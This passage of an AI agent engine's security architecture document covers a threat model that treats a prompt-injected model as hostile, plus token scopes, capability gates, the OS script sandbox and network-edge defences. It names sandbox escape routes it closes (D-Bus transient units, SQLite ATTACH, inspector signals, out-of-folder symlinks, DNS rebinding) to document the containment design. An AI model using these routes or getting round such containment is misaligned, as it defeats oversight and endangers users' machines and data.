# Gezel Security Architecture

> **Status / provenance.** This document describes Gezel's current security architecture. It is the canonical
> high-level reference; for the secrets store specifically see [secrets-security.md](secrets-security.md),
> and for the runtime/hosting shape see [../AGENTS.md](../AGENTS.md). File paths below are
> relative to the repo root.
>
> Controls are tagged with their enforcement status: **ENFORCE** (active), **AUDIT**
> (wired, log-only by default pending field validation — flip via an env flag), or
> **DEFERRED** (designed, not yet built). Keep these tags current when you change a control.

---

## 0. Why this document exists

Gezel runs **LLM-authored code and LLM-driven tools on the user's machine**, pointed at
whatever provider the user chooses. That makes it an engine whose primary input — model
output — is **partially attacker-controlled** whenever the model processes untrusted content
(a web page, a file, a repo, an email). The whole security posture follows from that single
fact. If you are adding a capability that the model can reach, read §13 (Invariants) first.

---

## Contents

1. Threat model
2. Trust boundaries & defense layers (the map)
3. The local daemon: network edge
4. Authentication & authorization: the token system
5. The security-policy / capability model
6. The script sandbox
7. The model's reach: MCP tools, surface filtering, blast radius
8. Secrets at rest & in transit
9. Electron shell hardening
10. Path-safety primitives
11. SSRF guard
12. Process execution & supply chain
13. Cross-cutting invariants (read before extending)
14. Known limitations & deferred work
15. Configuration / environment-flag reference
16. Key-file index

---

## 1. Threat model

Gezel is **local-first and single-user by default**. The actors we defend against, in
rough priority order:

| # | Actor | What they can do | Why it matters |
|---|---|---|---|
| 1 | **Prompt-injected model** | Emit any tool call / author any script, steered by untrusted content the model is reading | The core risk for an agent engine. Mitigations must assume the model is hostile. |
| 2 | **Malicious local script** | Code authored by the model (or pasted by the user) running in the script sandbox | Wants to escape the sandbox, exfiltrate data, or reach secrets. |
| 3 | **Malicious web page** in the user's browser | Cross-origin requests to the loopback daemon (CORS / DNS-rebinding) | Turns "localhost only" into remotely reachable if the edge is weak. |
| 4 | **Other local user** (shared / multi-user host) | Read world-readable files; `ps`/`/proc` snooping | Loopback does **not** isolate local users from each other. |
| 5 | **Supply chain** | Malicious dependency, tampered bundle, install-script abuse | Code we execute as the user at install/build/run time. |

**Out of scope (accepted):** an attacker who already has code execution as the user (they
can read `~/.gezel`); a user who deliberately disables a control; nation-state side channels.
Several controls are *defense-in-depth* against actor #1/#2 even though a fully-compromised
host is out of scope — the point is to contain a prompt injection, not a root shell.

---

## 2. Trust boundaries & defense layers (the map)

```
┌──────────────────────────────────────────────────────────────────────┐
│ Electron renderer (React UI)  ── partially-attacker-controlled DOM     │
│   CSP · contextIsolation · sandbox · cert-pinning · nav allowlist      │
└───────────────┬───────────────────────────  preload (contextBridge)   │
                │ window.__GEZEL__ {token, baseUrl}  (narrow IPC)        │
┌───────────────▼──────────────────────────────────────────────────────┐
│ Electron main (supervisor)  ── trusted, signed/notarized              │
│   spawns gezeld · pins loopback cert · bundle integrity verify         │
└───────────────┬──────────────────────────────────────────────────────┘
                │ 127.0.0.1:<port>  loopback TLS 1.3 + bearer token      │
┌───────────────▼──────────────────────────────────────────────────────┐
│ gezeld (HTTP daemon)  ── the trust hub                                │
│   host-guard → bearerAuth → projectScopeGuard → teamRouteGuard →       │
│   gezelScopeGuard → route → Store / providers                          │
└───────────────┬───────────────────────────────────────────────────────┘
                │ stdio + fd-3 RPC, scoped session token on HTTP         │
┌───────────────▼──────────────────────────────────────────────────────┐
│ MCP subprocess  &  script sandbox  ── UNTRUSTED (model code)          │
│   node --permission · Seatbelt · env-scrub · net-block · caps gate     │
└──────────────────────────────────────────────────────────────────────┘
```

The **enforcement layers** a model-driven action passes through, outermost first:

1. **Tool surface** — the model is only *offered* the tools its role + security level allow.
2. **Call-time dispatch guard** — the bridge rejects a call for a tool not on the surface,
   even if the model fabricates it (so the surface is a real boundary, not a hint).
3. **HTTP auth + scope guards** — the daemon ties every request to a token and confines it
   to a project / gezel / non-team route set.
4. **Sink checks** — the handler that actually performs the action re-checks the security
   policy (egress, file edits, etc.) so a non-model caller can't bypass layers 1–2.
5. **OS sandbox or refusal** — `denyNet` script execution runs under macOS Seatbelt, the
   Windows MXC process container, or a probed Linux systemd boundary, or fails closed; no
   platform substitutes a JavaScript shim for an OS boundary.

> **The load-bearing principle (see §13):** layers 1–2 protect against *the model*; layers
> 3–5 protect against *every other principal that can reach the same capability*. A control
> that only filters the tool surface is not a complete boundary.

---

## 3. The local daemon: network edge

`packages/service/src/http/server.ts`, `cert.ts`, `host-guard.ts`, `cors.ts`.

- **Loopback by default.** The primary listener and native-engine child ports bind
  `127.0.0.1`. An explicit `remoteServing.enabled` setting adds a second LAN listener for
  paired inference. That listener serves a **separate deny-by-default allowlist app**
  (`buildRemoteApp` in `http/remote-server.ts`: exactly `/v1/identity`, the pairing/grant
  routes, and `/v1/remote/*`; everything else 404s), so adding a loopback route never
  exposes it on the LAN as a side effect — but every boundary on the allowlisted routes
  must still remain valid on a routable interface. The listener is hosted by whichever
  daemon owns the engines: the machine-engine broker on machine installs (headless,
  configured through the loopback `/v1/remote/manage/serving` surface), else the user
  daemon. `bindAddress` is validated to an IP literal at bind time, and per-tenant limits
  (concurrency + `requestsPerMinute`) are enforced for paired devices while the first-party
  bridge credential is exempt.
- **Pairing a device by connect code** (core `remote/spake2.ts` and `remote/pairing.ts`,
  shared by the daemon and the phone; the server half in `remotes/pairing-code.ts` and
  `http/routes/v1-apps-pair.ts`). Settings → Remote Servers → Add a device shows a random
  8-digit code; the connecting device types it, and the two daemons run SPAKE2 (RFC 9382,
  P256-SHA256-HKDF-HMAC, checked against the RFC's test vectors) over the TLS channel pinned
  to the cert the server's identity signed. Both identity fingerprints are in the transcript,
  so a confirmed run proves each side reached the identity it pinned, and the server issues
  the `remote-inference` device token only after the client's confirmation checks out. A
  short code is safe only because of the PAKE: anything derived from it that crossed the
  network (a hash, an HMAC) would fall to an offline search of 10^8 values, whereas SPAKE2
  gives an active attacker one guess per run. The server allows five runs per code, starts
  counting at round one (that is where a guess becomes testable), shows a code only on
  request, expires it after five minutes, and closes it after one device pairs. The code
  never reaches disk and the management route (`/api/remote-serving/pairing-code`, or the
  broker's `/v1/remote/manage/serving/pairing-code`) is loopback and first-party only. The
  group arithmetic is BigInt, not constant-time (RFC 9382 §7 asks for that): scalars are
  fresh per run and the password is a short-lived single-use code, which keeps the timing
  exposure to that run. Clients from before connect codes still pair through
  `/v1/apps/register` plus an Approve click and a 64-bit identity-code comparison;
  `/v1/identity`'s `pairingMethods` tells a client which it may use.
- **LAN discovery** (`remotes/lan-discovery.ts`, `remotes/dns-sd.ts`). While the listener runs,
  the daemon that owns it answers multicast DNS for `_gezel._tcp` with its port, LAN
  addresses, display name, and identity fingerprint — material `/v1/identity` already gives
  anyone who can reach the port. `remoteServing.advertise: false` keeps it unlisted. The
  browser half runs only while Settings → Remote Servers polls, sends one-shot legacy-unicast
  queries from an ephemeral port, and closes a minute after the last poll. An advertisement
  is never a trust decision: it fills in an address, and pairing verifies the identity
  itself. The DNS decoder reads untrusted packets, so every read is bounds-checked and a
  compression pointer may only jump backwards (fuzzed in `dns-sd.test.ts`).
- **Following a paired server to a new address** (`remotes/reachability.ts` `relocateRemote`).
  When a paired server can't be reached and discovery reports its fingerprint at another
  address (a new DHCP lease), the client adopts that address only after the server there
  proves the pinned identity: its `/v1/identity` key must hash to the pinned fingerprint and
  sign a TLS certificate, and a request pinned to that certificate must then complete at
  the new address, which proves the server there holds the certificate's key. The
  certificate becomes the new pin. A device that announces someone else's fingerprint
  cannot produce the signature, and one replaying the real server's signed identity cannot
  complete the pinned handshake, so the most either can cause is one wasted probe. The
  phone follows the same rule. Reachability itself is never a trust input: an unreachable
  server only changes where work runs (this install's own provider answers, and says so
  on the reply), never what a peer is allowed to do.
- **Phones using a server's models** (core `runtime/remote-servers.ts`, mobile
  `src/remote.ts`, the `GezelRemote` native plugins). A phone only connects; it never
  serves. It pairs with the same connect-code client the daemon runs and keeps each
  pairing, device token included, in `remotes.json`: Device tier, so app storage only,
  never the person's synced Work folder or a gezel backup (Android also sets
  `allowBackup="false"`). The page cannot reach a server itself (`connect-src 'self'`), so
  requests go through the OS: the plugin accepts only `https://` IP-literal URLs (it is not
  a general proxy), trusts exactly the leaf certificate the page pinned, and skips hostname
  checks because that certificate names 127.0.0.1. Before anything is pinned, `/v1/identity`
  is read without a pin, and the page accepts what it says only if the identity key signs
  the certificate presented. On Android that first read takes the certificate from a
  handshake the plugin refuses and then pins the request to it, so no trust manager ever
  accepts a certificate it was not given. When the pinned certificate is refused (the
  server restarted and made a new one), the phone re-reads the identity and adopts the new
  certificate only if the pinned identity signed it. A turn on a server's model runs the
  phone's own tool loop: the server sees the prompt and tool schemas and returns calls,
  and every tool runs on the phone against the phone's files. Discovery uses Bonjour or
  NSD for `_gezel._tcp`, and on iOS that is behind the system local-network prompt. The
  Klerk and other background chores stay on the phone's own model.
- **TLS 1.3, self-signed, per-launch.** Default transport is HTTPS/2 with a self-signed
  loopback cert; the private key lives in memory only and never hits disk (only the public
  cert PEM + fingerprint are written, world-readable by design). Downgrade to plain HTTP
  requires explicit `GEZEL_INSECURE_TRANSPORT=1`.
- **DNS-rebinding host-guard** (`hostGuard()`), runs *before* auth and the static UI. Rejects
  any `Host` not in the loopback literal set (`127.0.0.1`, `::1`, `localhost`, with port/
  bracket stripping). Closes the classic `127.0.0.1.evil.com` rebinding bypass.
- **CORS is scoped and never `*`-with-credentials.** `v1Cors()` reflects a specific Origin
  (so `Allow-Credentials: true` is legal) and is mounted **only on `/v1/*`**, never `/api/*`
  (the `/api/*` surface returns no CORS headers, so a browser can't read its responses).
  CORS is **deliberately not served on the unauthenticated endpoints**: `/v1/apps/*` (the
  app-grant surface, so a drive-by page can't script the register→token-poll flow),
  `/v1/identity` (the device id, which survives cookie clearing), and `/v1/openapi.json`
  (the version). On the **Office listener** it answers only the task pane's own origin:
  that listener has a stable port and a certificate every browser on the machine trusts,
  so echoing any Origin there would let every website read from Gezel. A page can still
  tell the port answers (an opaque `no-cors` probe); it cannot read what it says.

**Net:** the loopback + host-guard + scoped-CORS triad keeps "localhost only" from becoming
remotely reachable. The residual edge risks are local-multi-user (§1 actor #4), handled by
file permissions, not the network.

---

## 4. Authentication & authorization: the token system

`packages/service/src/http/token-store.ts`, `auth.ts`, `scope-guard.ts`.

### 4.1 Token kinds & scopes

Every `/api/*` and `/events/*` request carries a bearer token (header `Authorization: Bearer`
or `?token=` for EventSource/`<script>`). `bearerAuth` looks it up in the `TokenStore` and
sets `c.var.auth = { appId, scopes, projectId?, gezelId?, team? }`.

| Token | `scopes` | Persisted? | Reach |
|---|---|---|---|
| **root** | `['root']` | no; process memory only | full `/api/*` + `/v1/*` |
| **desktop client** | `['ui','openai','knowledge','images']` | no; written to `runtime/auth-token` | first-party product API + local OpenAI facade + `/v1/knowledge/*` + `/v1/images/*` |
| **web-ui** | `['ui']` | no (ephemeral) | first-party product API; never daemon root |
| **inference app** (`/v1/apps/register`) | `['openai']` | yes (`tokens.json`, 0600) | only `/v1/*` inference, gated by `requireScope('openai')` |
| **image app** (`/v1/apps/register`) | `['images']` (beside `openai`/`knowledge`) | yes (`tokens.json`, 0600) | `/v1/images/*`: on-device image generation and its model downloads, gated by `requireScope('images')`, never the Integrations switch; on-device models only, on the machine broker once one is adopted |
| **product app** (`/v1/apps/register`) | `['product']` (+ `openai` when needed) | yes (`tokens.json`, 0600) | ordinary `/api/*` product access; never first-party app-grant administration |
| **CLI** (`/v1/apps/register`) | `['cli']` | yes (`tokens.json`, 0600) | ordinary `/api/*` product access with CLI-specific consent copy |
| **session** (a gezel's MCP subprocess) | `['session']` + `projectId`/`gezelId`/`team` | **no** (ephemeral, dies with daemon) | deny-by-default MCP route allowlist + ownership guards |
| **harness** (an outside AI app's `gezel-mcp --harness`) | `['harness']` + optional `projectId` | **no** (ephemeral; minted by `/v1/apps/harness-connect` for the owner credential) | `harnessRouteGuard`'s short allowlist; never `/events`; see [harness-tools.md](harness-tools.md) |

`TokenRecord` carries optional `projectId`, `gezelId`, and `team` (set only on session
tokens). `issueSession()` mints an ephemeral, never-persisted, upsert-on-respawn token;
`revokeSession()` drops it. The root token comparison is a `Map` lookup of a high-entropy secret.

Stateful app scopes (`product`, `cli`, `knowledge`, `images`, and future non-inference
scopes) require a daemon-generated six-character requester code in addition to the detailed
consent prompt.
The requester receives and displays the plaintext once; the daemon persists only a salted
hash, and the Gezel approval surface never displays the code. Inference-only scopes may opt
into the same handshake.

A connected app may widen its own grant without disconnecting: it registers again,
presenting its current token, with every scope it holds plus the new ones. That opens an
upgrade grant (`upgradeFrom` on the grant record) with the same consent and code. The
current token keeps working until approval, when `TokenStore.replace` swaps it for the
wider one in one write; a denial or expiry leaves it as it was. Only the token's holder can
ask, so no other local process can collect a wider token issued in that app's name.

A grant recorded by a newer build with a scope this build does not know keeps its known
scopes (a pending grant carrying one is dropped whole), rather than failing the whole
token file as corrupt. Known internal scopes (`root`, `ui`, `session`) in a durable
record still fail closed.

One exception, for Gezel's own local add-ins (Office, LibreOffice, VS Code): an add-in that
proves it runs as the daemon's owner gets its fixed grant without the code
([ADR 0018](decisions/0018-local-add-in-grants.md)). The proof is possession of something
only that account can read: the owner credential in `runtime/auth-token`, exchanged through
first-party-authenticated `POST /v1/apps/local-connect`; a token file Settings provisions
at 0600; or the Office enrollment key in the add-in's 0600 manifest, presented to
`POST /v1/apps/office/enroll`. Other local accounts and web pages can read none of these,
which is exactly what the code was proving. The routes name only those three app ids, and
the code flow stays their fallback.

### 4.2 Internal and session scope guards

The MCP subprocess used to receive the **root** token; it now receives a **session token
scoped to `{projectId, gezelId}`**, minted at spawn in `chat/manager.ts` and revoked on
session teardown. `team` is derived from `roleHasTeamScope(role, projectMode)` in
`role-tool-filter.ts` — true for coordinator roles (meester / voorman / planner) outside a
solo job — so the token's cross-project reach can't drift from the team tools the model is
actually offered. `requireInternalApiAccess` first keeps inference-only app/device tokens on
`/v1`, while admitting explicitly approved `product` and `cli` credentials.
`sessionRouteGuard` then denies session tokens by default, admitting only explicitly classified
MCP routes and rejecting config, raw sessions/tool invocation, events, terminals, engine/admin
routes, foreign project-document fallbacks, and body/query scope spoofing. It also keeps the
user's own moves off session tokens: applying or dismissing a change proposal (apply is the
only `userInitiated` workspace write), firing or dismissing report actions, forcing a step past
its gate, and creating a task that trusts custom scripts are denied outright; retrying or
resuming a paused task (and, for a coordinator, canceling one) is admitted only inside a turn
the user started (`ChatManager.isUserDirectedTurn`). A session-token `/scripts/run` is recorded
as a `chat` run, never `manual`, so the script-execution policy and gezel-only artifact denials
apply.

Nothing a session sends may widen what it, or its crew, is allowed. Refused outright:
credential grants and their origins, linked projects, the Claude/Codex permission modes and
`gezel.*` properties on a project; a gezel's `sandboxCopilot`, permission modes,
`factualWriting` and raw `gezel.md`; posting to `/api/gezels/:id/chat/*` (it has no sender, so
it would read as the person's own turn and open every gate above); installing an AI App
(previewing one stays open); the approval-free `/install`; project icons, prompt drafts, and
jumping a task to a step. Admitted only inside a turn the person started: moving a project's
folder (`workingDir`, on create too), switching on a schedule, night work or suggested work,
and answering growth proposals. The task routes refuse a session's recipe edit that would
change or remove the person's own step, or route around it, and on a started task one that
changes or removes a check (`gate`, `advanceWhen`, `toolPolicy`) or rewires steps; adding
steps and checks stays open (`tasks/session-recipe-guard.ts`). Below the guard, the Store
starts a moved folder read-only for every caller and keeps the shared library's marker
where it is, and a moved folder passes the same forbidden-root check as a new one.

Three ownership/role middlewares provide additional defense-in-depth:

| Guard | Confines a **non-team session** token to… | Env flag | Default |
|---|---|---|---|
| `projectScopeGuard` | `/api/projects/<its projectId>/*` only | `GEZEL_TOKEN_SCOPE` | **ENFORCE** |
| `teamRouteGuard` | (denies) team/orchestration routes — create/message gezels, create projects + tasks, cross-gezel asks | `GEZEL_TEAM_SCOPE` | **ENFORCE** |
| `gezelScopeGuard` | its own gezel's identity/private state (path `/api/gezels/:id/*`, `?gezel=` query, and `gezelId` in memory/session bodies) | `GEZEL_IDENTITY_SCOPE` | **ENFORCE** |

Rules common to all three: tokens with **no project/gezel binding** (root/ui/app) bypass;
**coordinator** (`team:true`) sessions bypass the project + gezel guards (they orchestrate
the crew); each mode is `enforce` | `audit` (log `WOULD-DENY`, allow) | `off`; every denial
logs `[token-scope]` / `[team-scope]` / `[gezel-scope]`.

The `audit` and `off` modes remain explicit operator escape hatches; shipped defaults enforce.
They do not reopen a team route to a worker: `sessionRouteGuard` refuses every route
`teamRouteGuard` lists on its own, so the two never disagree about a worker
(`coordinator-only-tools-guard.test.ts` replays each route through `sessionRouteGuard` alone).
Sessions may read `GET /api/handboek/how-do-i` (the `how_do_i` tool in every role kit); the
rest of the Handboek API stays first-party.

---

## 5. The security-policy / capability model

`packages/core/src/security/policy.ts` — the single source of truth.

One config object (`config.securityPolicy`) drives everything. The `level` is a **UI label
only**; enforcement reads the **capability booleans** via `resolveSecurityPolicy()`, never the
level. The
axis that matters is **agency** — these gate what *the model* may do autonomously; user-
initiated actions (a human pulling a repo, the app's own npm/CLI processes) are exempt.

| Capability | `super-lockdown` | `lockdown` | `free` |
|---|---|---|---|
| `allowFileEdits` (model Git/GitHub + script `documents.write`) | ✗ | ✓ | ✓ |
| `allowExternalChat` (cloud LLM providers) | ✗ | ✓ | ✓ |
| `allowExternalServices` (web search, `fetch_url`, …) | ✗ | ✗ | ✓ |
| `allowScriptExecution` (gate-scripts, code-exec) | ✗ | ✓ | ✓ |
| `allowAppNetwork` (background app egress) | ✗ | ✓ | ✓ |
| `allowPackageScriptExecution` (`run_package_script`, `run_npx`) | ✗ | ✗ | ✓ |
| `allowPackageScriptEdits` (gezel edits to a package manifest's `scripts`) | ✗ | ✗ | ✓ |
| *derived* `allowModelGit` (= `allowFileEdits`) | ✗ | ✓ | ✓ |
| *derived* `allowNonBuiltinToolsets` (= services ∧ scripts) | ✗ | ✗ | ✓ |

There is one deliberately narrower exception to `allowNonBuiltinToolsets`:
the exact system-managed `@playwright/mcp` package may run for an eligible
browser-facing role/project while External services are off, but only through
Gezel's bridge-backed **local preview browser** profile. That profile exposes a
small interaction/inspection tool subset (no evaluate, unsafe code, uploads,
or storage mutation), rewrites only in-workspace `file:` aliases to a
short-lived preview capability, and forces Chromium through the dedicated
preview-only HTTP listener as a non-forwarding proxy. The listener serves
capability paths, rejects ordinary paths/foreign hosts, and destroys CONNECT
and WebSocket upgrades; the preview document CSP independently blocks external
resources, connections, forms, frames, WebRTC, and DNS prefetch. User-installed
Playwright copies and native SDK/CLI MCP loops do not receive this exception.
Changing the security policy hard-resets live chat/MCP sessions so a browser
started under `free` cannot survive a switch into a locked posture.

`allowFileEdits` is a legacy-named, file-adjacent capability. It does **not** decide whether
a gezel may mutate a project workspace, and it does not hide the builtin shared-document
tools. Workspace writes through Gezel-managed sinks have a separate per-project policy:

| `project.managedWorkspaceWritePolicy` | Internal workspace | External `workingDir` |
|---|---|---|
| `allow` | writable | writable |
| `deny` | read-only | read-only |
| `auto` or absent | writable | read-only |

`allowGezelWrites` is a legacy on-disk boolean accepted only for compatibility and translated
to `allow` / `deny` by the centralized resolver. New code must not read it directly.

Provider-native harnesses are a separate path. Codex CLI uses the project-level
`codexPermissionMode` (`Plan / Edit / Reviewed / Full`), while Claude CLI uses the project-level
`claudePermissionMode` (`Plan / Ask / Edit / Full` in the UI). Each project override wins over
per-gezel and install defaults. Explicitly unsandboxed Copilot can also replace the managed
filesystem surface for its session. `providerNativeWorkspaceAccess` resolves these paths;
`resolveGezelWorkspaceAccess` combines it with the managed policy for one effective gezel.

An absent stored policy resolves fail-safe to `lockdown` (`DEFAULT_SECURITY_LEVEL`). During
first-run migration, a configured legacy install gets an explicit `free` policy to preserve
its prior behavior; a genuinely new install gets explicit `lockdown`. `custom` is any
off-preset combination (`classifySecurityLevel` re-labels the slider).

**Where the policy is enforced** (defense in depth — never a single layer):

1. **Tool-surface filter** — `applySecurityPolicyGates` (`role-tool-filter.ts`) strips gated
   tool *names* from what the model is offered. Fires in every branch (incl. the Claude-CLI
   `--disallowedTools` path), so opting out of role filtering can't smuggle a tool back.
2. **Call-time dispatch guard** — `isCallableByModel` (`providers/mcp-bridge-pool.ts`) rejects
   a builtin tool call that isn't on the allowlist, even if the model fabricates it. This is
   what makes the surface filter a real boundary against a prompt-injected model.
   The local preview browser applies the same rule inside its Playwright bridge:
   pruned tools are absent from the bridge's callable name set, and its wrapper
   rejects non-preview navigation before dispatch.
3. **Sink checks** — the action handlers re-check the policy independently:
   - `web_search` → `providers/search/factory.ts` (no provider when
     `!allowExternalServices`).
   - `wikipedia_search` / `wikipedia_read` → `http/routes/tools.ts` checks
     `allowExternalServices` at the route. These build their provider directly rather than
     through `createSearchProvider`, so they do **not** inherit the factory's ceiling and
     must carry their own — a zero-key lookup is still egress, since it reveals what is
     being researched. Both exempt `GEZEL_MOCK_PROVIDER=1` in the same order the factory
     does, because the mock issues no request at all.
   - `fetch_url` → `http/routes/tools.ts` checks `allowExternalServices` **and** SSRF (§11).
   - external chat → `chat/manager.ts` (`!allowExternalChat` → refused).
   - script execution → `scripts/runner.ts` (gates the run; strips `network`/`credential:*`
     caps when `!allowExternalServices`, applies the per-project workspace gate to
     `workspace.write`, and strips `documents.write` when `!allowFileEdits`).
   - managed workspace writes → `fs/store.ts` `assertWorkspaceWritable` (the per-project
     named policy above; independent of `allowFileEdits`).
   - package scripts → `workspace/scripts.ts` (`allowPackageScriptExecution`); package
     manifest `scripts` edits → `fs/store.ts` `guardPackageScriptEdit`
     (`allowPackageScriptEdits`). See §7.

> **Surface filtering alone is not a sink.** `web_search` fails closed at both its surface
> and its provider; `fetch_url` must enforce at its route too, or a direct token-holder (or a
> future re-surfacing of the tool) bypasses "nothing leaves your machine." See §13.

**Copilot provider-native tools fail closed into this model by default.** An absent
`sandboxCopilot` setting denies the Copilot SDK's built-in shell, URL, file, and grep tools
and leaves the scoped MCP equivalents available. Explicit install-level or per-gezel
`sandboxCopilot: false` is a compatibility escape hatch: it restores the SDK built-ins and
their `approveAll` permission handler, so those actions do not receive Gezel's MCP scope,
sink checks, or complete audit trail. The current SDK does emit
`tool.execution_start` / `tool.execution_complete` events, and Gezel forwards observed
completions into `tool.called` History entries. That is useful visibility, not an
enforcement boundary or a completeness guarantee: it depends on provider-emitted events,
omits the phase-only `report_intent` tool, and carries less result detail than an MCP-bridged
call.

---

## 6. The script sandbox

`packages/service/src/sandbox/runner.ts`, `macos.ts`; `packages/service/src/scripts/`;
`packages/sdk`. Backs gate-scripts (`defineScript`) and the model's `run_nodejs_script`
tool. `run_playwright_script` does **not** run here — it starts a browser and needs the
network — so its boundary is the user's approval instead (§12).

**Execution model — a real OS process, not `node:vm`.** `vm` is *not* a security boundary
(constructor escapes); Gezel correctly avoids it. Each run is `child_process.spawn` of a Node
binary wrapped in:

1. **`node --permission`** with `--allow-fs-read` / `--allow-fs-write` scoped to the script's
   scratch + workspace dirs. `--allow-child-process`, `--allow-worker`, `--allow-addons` are
   all **OFF** (so no `child_process` escape, no fork bombs, no native addons).
2. **The platform's OS sandbox** around every run: macOS Seatbelt (`sandbox-exec`) with a
   `deny default` profile, or on Windows the MXC process container (below).
3. **Network egress block** (`denyNet`, **fail closed**): Seatbelt `(deny network*)`, the
   container's denied egress, or (Linux) a systemd user service restricted to `AF_UNIX`.
   Network-on work on Linux runs in the same kind of unit restricted to
   `AF_INET AF_INET6 AF_NETLINK` when that probe passes, so it cannot reach the D-Bus bus
   (whose `StartTransientUnit` starts an unconfined process) or the Docker socket.
   The JS `--import` preload also blocks fetch/WebSocket,
   net/dgram, callback + promise DNS, named built-in exports, and Resolver instances, but is
   defense-in-depth rather than a malicious-code boundary. Where no boundary applies the run
   exits 126; no platform retries a failed denyNet launch unsandboxed. Script RPC uses fd 3,
   or stdio inside the Windows container and the Linux systemd unit (`systemd-run --pipe`
   passes only the standard pipes), and never opens a socket.
4. **Resource cap** — `--max-old-space-size` bounds heap so a runaway allocation can't OOM the
   host; wall-clock timeout + SIGKILL.
5. **Env scrub** — `sandboxEnv` allowlists only `PATH`/`HOME`/`NODE_*`/locale; strips
   `GEZEL_TOKEN`, `OPENAI_API_KEY`, etc. → a script **cannot read host secrets from
   `process.env`**.
6. **What the permission model leaves open**, closed for every run where the Node binary
   has the option (read from `node --help`): `--no-experimental-sqlite` (`node:sqlite`
   opened, ATTACHed and VACUUMed INTO any path) and `--disable-sigusr1`. A preload replaces
   `process._kill` and `process._debugProcess`, so a script signals only itself and opens no
   other Node process's inspector; `process.binding` is refused under `--permission`, so the
   originals are out of reach. Network-on runs also get a preload that refuses local-socket
   and named-pipe connects (`net.Socket#connect` with a path): the permission model gates
   neither, and `fs` cannot open a pipe there. Both preloads are defense in depth.
7. **Links that lead out of the folder** — the permission model checks the path a script
   names and the kernel follows any link on it, so a cloned repository's `r -> /` reached
   anywhere. Where nothing confines the file system by real path (Linux, Windows without the
   container) the run is refused when its folder holds a link that resolves outside the
   granted roots, dangling links included (`sandbox/escaping-links.ts`, at most 500,000
   entries, refused past that). Workspace scripts (`run_nodejs_script`, `derive_file`) count
   only their write roots as granted (`linkTargets: 'write'`), since a write through a link
   into the read-only artifacts drawer lands there. A link to a root-owned regular file this
   account cannot write (`.venv/bin/python3 -> /usr/bin/python3`) is allowed on POSIX: it
   reaches nothing a script could not read by name, and the kernel refuses writes through it.
   A link to a root-owned folder is never allowed: `/home` and `/` are not writable
   themselves, but the account's own files sit beneath them. A script
   cannot make such a link: `symlink`, `link` and renames out are all refused under
   `--permission`.

**The daemon's own inspector.** Any process of the account can open a Node process's
inspector — SIGUSR1 on POSIX, `process._debugProcess(pid)` on Windows — and then run code in
it. Every launcher Gezel owns starts `gezeld` with `--disable-sigusr1` (the client spawn the
supervisor, CLI, VS Code and app SDK share, `gezel start --foreground`, the autostart units,
the installed services, the Docker entrypoint; `DISABLE_DEBUG_SIGNAL_FLAG` in core
`native/debug-signal.ts`). Electron ignores `execArgv` in a utility process, so the
supervisor forks one with the flag in `NODE_OPTIONS` and clears it again before the service
loads; the packaged main process relies on the `enableNodeCliInspectArguments` fuse. For
hosts that pass nothing (an app embedding the service), `startService` takes SIGUSR1 with a
listener on POSIX and warns on Windows, where no listener helps (`debug-signal-guard.ts`).

**Windows: the MXC process container** (`sandbox/windows-mxc.ts`, `stdio-rpc.ts`;
[ADR 0022](decisions/0022-windows-mxc-sandbox.md)). Microsoft's signed launcher
`wxc-exec.exe` wraps the Node command line, one base64 policy argument per run:

- **Grants** are the permission model's allowlist: read-write for the workspace and scratch,
  read-only for the other read paths and the Node binary file. A grant on a drive or share
  root, on anything containing the home folder or `GEZEL_HOME`, or (for writes) on the
  launcher or Node binary is refused before launch, because a root grant cascades to the
  whole volume.
- **Network**: denyNet runs get no egress; other runs get egress. Host loopback and inbound
  are always denied, so a script cannot reach the daemon.
- **UI**: Win32k stays enabled (node.exe fails DLL init without it); clipboard and input
  injection are denied. The fallback tier that rewrites host DACLs is refused.
- **Module resolution**: every ancestor of a grant is unreadable inside the container, so
  Node runs with `--preserve-symlinks(-main)` and a preloaded resolve hook that computes real
  paths by following links inside the grants. pnpm's junction layout resolves normally.
- **RPC** moves to stdio: init is the first stdin line, replies follow on stdin, and frames
  reach stdout behind a per-run nonce marker, so printed text is never read as a call. Each
  frame is capped at 64 MB on both transports.
- **Availability** is an executable probe at boot (write inside a grant, read-only grant,
  denied sibling, refused raw socket), cached, re-run when the launcher changes on disk. A
  Settings switch (`scriptSandbox.windowsContainer`) and `GEZEL_MXC=off` turn it off. A
  caller in Session 0 (a service or SSH logon) cannot host Node in a container: its window
  station grants nothing to app containers, so the probe reports the host unavailable and
  denyNet work fails closed. The product daemon runs in the signed-in session, so this does
  not affect shipped installs.

**Capabilities.** A script declares `meta.requires` (e.g. `network`, `credential:github.token`).
The dispatcher (`scripts/dispatcher.ts`) enforces per call; the runner strips capabilities
that exceed the security ceiling. Credential **values resolve server-side** (`http.authed`
runs the fetch in the parent and returns only the response body; the raw value joins the
per-run redaction set and never enters the script's address space).

**Path & cross-tenant safety.** Workspace/artifact/document writes go through `resolveInside`
(§10); reads now do too. Task refs (`splitRef`) validate the `projectId` segment so a crafted
`../`-laden ref can't traverse the projects root. `http.authed` uses `redirect:'manual'` so a
30x can't bounce a credential to another origin. Built-in credentials are pinned to their
service-owned HTTPS origins, webhook credentials follow the configured webhook URL's exact
origin, and toolset credentials retain explicit project-scoped origin bindings.

---

## 7. The model's reach: MCP tools, surface filtering, blast radius

The MCP server (`packages/mcp`) is a stdio proxy: every tool calls back into the daemon over
HTTP carrying the session's **scoped** token (§4.2). Project/gezel context is **baked into
the subprocess env** (`GEZEL_PROJECT_ID`, `GEZEL_AGENT_ID`) — the file/workspace/artifact/run
tools use the baked ids, so the model cannot redirect them to another project/gezel via a tool
argument. Cross-project/team tools (`message_gezel`, `create_task`, `update_project`, …) are
**role-gated** to coordinators and dispatch-blocked for workers.

**Blast radius of a prompt-injected model, by level:**

- **super-lockdown** — local models only; no egress, script execution, model Git/GitHub, or
  background update checks. Artifact and builtin shared-document writes remain available.
  Workspace writes follow the per-project gate: internal workspaces are writable by default,
  while external folders require explicit opt-in. Egress is off at the surface, the call-time
  guard, *and* the sinks.
- **lockdown** — adds cloud chat, sandboxed script execution, model Git/GitHub tools, and
  auto-update, but keeps open-web services, mail, unconfined third-party toolsets, and package
  scripts off. Package scripts run unsandboxed with the network, so they would reach the open
  web the level promises to keep closed; each package switch can be turned on by itself.
  Cloud CLI agents (Claude Code, Codex, Copilot) run here too, without their own shell (§7.1).
- **free** — adds `fetch_url`/`web_search` (SSRF-guarded), non-builtin MCP toolsets
  (unconfined third-party code — the riskiest surface, `free` only), and a CLI agent's own
  shell and no-sandbox modes, which run as the person (§7.1).

**Self-escalation is contained:** no MCP tool writes `securityPolicy`, the session guard
